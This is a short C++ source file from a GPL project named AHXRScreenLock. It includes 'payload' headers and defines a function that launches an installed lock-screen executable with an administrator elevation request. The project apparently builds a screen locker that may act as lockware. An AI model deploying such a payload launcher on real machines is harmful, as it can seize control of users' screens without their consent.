/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include						"stdafx.h"
#include						"payload_lock.h"
#include						"payload_install.h"
#include						"resource1.h"
#include						<Windows.h>
#include						<string>

using namespace					std;

void loadLockScreen() {
	string s_install = getInstallPath() + string("\\") + LOCKED_FILE_NAME;
	ShellExecute(NULL, "runas", s_install.c_str(),
		" c:\\temp\\report.txt",
		NULL,                       
		SW_SHOWNORMAL
	);
}
